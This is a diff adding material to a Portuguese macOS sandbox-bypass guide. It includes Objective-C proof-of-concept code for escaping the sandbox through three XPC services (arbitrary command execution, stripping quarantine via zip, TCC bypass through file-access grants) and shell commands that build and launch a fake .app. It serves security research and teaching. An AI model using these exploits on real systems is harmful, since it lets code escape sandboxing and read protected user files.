@@ -10,21 +10,21 @@ Na imagem anterior, é possível observar **como o sandbox será carregado** qua
 
 O compilador irá vincular `/usr/lib/libSystem.B.dylib` ao binário.
 
-Então, **`libSystem.B`** chamará várias outras funções até que a **`xpc_pipe_routine`** envie as permissões do aplicativo para **`securityd`**. O securityd verifica se o processo deve ser colocado em quarentena dentro do Sandbox, e se sim, ele será colocado em quarentena.\
+Então, **`libSystem.B`** chamará várias outras funções até que o **`xpc_pipe_routine`** envie as permissões do aplicativo para **`securityd`**. O securityd verifica se o processo deve ser colocado em quarentena dentro do Sandbox, e se sim, ele será colocado em quarentena.\
 Finalmente, o sandbox será ativado com uma chamada para **`__sandbox_ms`** que chamará **`__mac_syscall`**.
 
 ## Possíveis Bypasses
 
 ### Ignorando o atributo de quarentena
 
-**Arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para evitar a fuga do sandbox. No entanto, se você conseguir **criar uma pasta `.app` sem o atributo de quarentena** dentro de um aplicativo em sandbox, você poderá fazer o binário do pacote do aplicativo apontar para **`/bin/bash`** e adicionar algumas variáveis de ambiente no **plist** para abusar do **`open`** para **iniciar o novo aplicativo sem sandbox**.
+**Arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para evitar a fuga do sandbox. No entanto, se você conseguir **criar uma pasta `.app` sem o atributo de quarentena** dentro de um aplicativo em sandbox, você poderá fazer o binário do pacote do aplicativo apontar para **`/bin/bash`** e adicionar algumas variáveis de ambiente no **plist** para abusar do **`open`** e **iniciar o novo aplicativo sem sandbox**.
 
 Isso foi o que foi feito em [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**
 
 > [!CAUTION]
 > Portanto, no momento, se você for capaz de criar uma pasta com um nome terminando em **`.app`** sem um atributo de quarentena, você pode escapar do sandbox porque o macOS apenas **verifica** o **atributo de quarentena** na **pasta `.app`** e no **executável principal** (e nós apontaremos o executável principal para **`/bin/bash`**).
 >
-> Note que se um pacote .app já foi autorizado a ser executado (ele tem um xttr de quarentena com a flag de autorizado a executar ativada), você também poderia abusar disso... exceto que agora você não pode escrever dentro de pacotes **`.app`** a menos que tenha algumas permissões privilegiadas do TCC (que você não terá dentro de um sandbox alto).
+> Note que se um pacote .app já foi autorizado a ser executado (ele tem um xttr de quarentena com a flag de autorizado a executar), você também poderia abusar disso... exceto que agora você não pode escrever dentro de pacotes **`.app`** a menos que tenha algumas permissões privilegiadas do TCC (que você não terá dentro de um sandbox alto).
 
 ### Abusando da funcionalidade Open
 
@@ -59,9 +59,153 @@ Se a partir do processo em sandbox você conseguir **comprometer outros processo
 ../../../macos-proces-abuse/
 {{#endref}}
 
-### Compilação Estática & Vinculação Dinâmica
+### Serviços Mach do Sistema e do Usuário Disponíveis
 
-[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de contornar o Sandbox. Porque o sandbox é aplicado a partir do userland quando a biblioteca **libSystem** é carregada. Se um binário puder evitar carregá-la, ele nunca será sandboxed:
+O sandbox também permite comunicar-se com certos **serviços Mach** via XPC definidos no perfil `application.sb`. Se você conseguir **abusar** de um desses serviços, poderá **escapar do sandbox**.
+
+Como indicado neste [escrito](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), as informações sobre serviços Mach estão armazenadas em `/System/Library/xpc/launchd.plist`. É possível encontrar todos os serviços Mach do Sistema e do Usuário pesquisando dentro desse arquivo por `<string>System</string>` e `<string>User</string>`.
+
+Além disso, é possível verificar se um serviço Mach está disponível para um aplicativo em sandbox chamando o `bootstrap_look_up`:
+```objectivec
+void checkService(const char *serviceName) {
+mach_port_t service_port = MACH_PORT_NULL;
+kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
+if (!err) {
+NSLog(@"available service:%s", serviceName);
+mach_port_deallocate(mach_task_self_, service_port);
+}
+}
+
+void print_available_xpc(void) {
+NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
+NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
+for (NSString* key in launchDaemons) {
+NSDictionary<NSString*, id>* job = launchDaemons[key];
+NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
+for (NSString* serviceName in machServices) {
+checkService(serviceName.UTF8String);
+}
+}
+}
+```
+### Serviços Mach de PID disponíveis
+
+Esses serviços Mach foram inicialmente abusados para [escapar do sandbox neste artigo](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Naquela época, **todos os serviços XPC exigidos** por um aplicativo e seu framework eram visíveis no domínio PID do aplicativo (esses são Serviços Mach com `ServiceType` como `Application`).
+
+Para **contatar um serviço XPC do domínio PID**, basta registrá-lo dentro do aplicativo com uma linha como:
+```objectivec
+[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
+```
+Além disso, é possível encontrar todos os serviços Mach de **Application** pesquisando dentro de `System/Library/xpc/launchd.plist` por `<string>Application</string>`.
+
+Outra maneira de encontrar serviços xpc válidos é verificar aqueles em:
+```bash
+find /System/Library/Frameworks -name "*.xpc"
+find /System/Library/PrivateFrameworks -name "*.xpc"
+```
+Vários exemplos abusando dessa técnica podem ser encontrados na [**escrita original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), no entanto, a seguir estão alguns exemplos resumidos.
+
+#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc
+
+Este serviço permite todas as conexões XPC retornando sempre `YES` e o método `runTask:arguments:withReply:` executa um comando arbitrário com parâmetros arbitrários.
+
+A exploração foi "tão simples quanto":
+```objectivec
+@protocol SKRemoteTaskRunnerProtocol
+-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
+@end
+
+void exploit_storagekitfsrunner(void) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
+[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
+[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
+[conn resume];
+
+[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
+NSLog(@"run task result:%@, error:%@", bSucc, error);
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc
+
+Este serviço XPC permitia que cada cliente sempre retornasse YES e o método `createZipAtPath:hourThreshold:withReply:` basicamente permitia indicar o caminho para uma pasta a ser compactada e ela será compactada em um arquivo ZIP.
+
+Portanto, é possível gerar uma estrutura de pasta de aplicativo falsa, compactá-la, depois descompactá-la e executá-la para escapar do sandbox, pois os novos arquivos não terão o atributo de quarentena.
+
+A exploração foi:
+```objectivec
+@protocol AudioAnalyticsHelperServiceProtocol
+-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
+@end
+void exploit_AudioAnalyticsHelperService(void) {
+NSString *currentPath = NSTemporaryDirectory();
+chdir([currentPath UTF8String]);
+NSLog(@"======== preparing payload at the current path:%@", currentPath);
+system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
+[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
+system("chmod +x compressed/poc.app/Contents/MacOS/poc");
+
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
+[conn resume];
+
+[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
+NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
+NSString *file;
+while ((file = [dirEnum nextObject])) {
+if ([[file pathExtension] isEqualToString: @"zip"]) {
+// open the zip
+NSString *cmd = [@"open " stringByAppendingString:file];
+system([cmd UTF8String]);
+
+sleep(3); // wait for decompression and then open the payload (poc.app)
+NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
+system([cmd2 UTF8String]);
+break;
+}
+}
+}];
+}
+```
+#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc
+
+Este serviço XPC permite conceder acesso de leitura e gravação a uma URL arbitrária para o cliente XPC através do método `extendAccessToURL:completion:`, que aceita qualquer conexão. Como o serviço XPC possui FDA, é possível abusar dessas permissões para contornar completamente o TCC.
+
+A exploração foi:
+```objectivec
+@protocol WFFileAccessHelperProtocol
+- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
+@end
+typedef int (*PFN)(const char *);
+void expoit_ShortcutsFileAccessHelper(NSString *target) {
+[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
+NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
+conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
+[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
+[conn resume];
+
+[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
+NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
+NSURL *targetURL = [fpWrapper url];
+
+void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
+PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
+if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
+NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
+else {
+NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
+NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
+}
+}];
+}
+```
+### Compilação Estática & Linkagem Dinâmica
+
+[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de contornar o Sandbox. Como o sandbox é aplicado a partir do userland quando a biblioteca **libSystem** é carregada. Se um binário puder evitar carregá-la, ele nunca será sandboxed:
 
 - Se o binário for **completamente compilado estaticamente**, ele poderá evitar carregar essa biblioteca.
 - Se o **binário não precisar carregar nenhuma biblioteca** (porque o linker também está em libSystem), ele não precisará carregar libSystem.
@@ -73,9 +217,26 @@ Note que **mesmo shellcodes** em ARM64 precisam ser vinculados em `libSystem.dyl
 ld -o shell shell.o -macosx_version_min 13.0
 ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
 ```
-### Entitlements
+### Restrições não herdadas
 
-Note que mesmo que algumas **ações** possam ser **permitidas pelo sandbox** se um aplicativo tiver uma **entitlement** específica, como em:
+Como explicado no **[bônus deste artigo](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, uma restrição de sandbox como:
+```
+(version 1)
+(allow default)
+(deny file-write* (literal "/private/tmp/sbx"))
+```
+pode ser contornado por um novo processo executando, por exemplo:
+```bash
+mkdir -p /tmp/poc.app/Contents/MacOS
+echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
+chmod +x /tmp/poc.app/Contents/MacOS/poc
+open /tmp/poc.app
+```
+No entanto, é claro que esse novo processo não herdará direitos ou privilégios do processo pai.
+
+### Direitos
+
+Observe que, mesmo que algumas **ações** possam ser **permitidas pelo sandbox** se um aplicativo tiver um **direito** específico, como em:
 ```scheme
 (when (entitlement "com.apple.security.network.client")
 (allow network-outbound (remote ip))
@@ -211,7 +372,7 @@ gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.pli
 codesign -s <cert-name> --entitlements entitlements.xml sand
 ```
 > [!CAUTION]
-> O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, o que o **Sandbox não permitirá**.\
+> O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, que o **Sandbox não permitirá**.\
 > Crie um arquivo lá, pois uma vez que o Sandbox seja contornado, ele poderá lê-lo:
 >
 > ```bash
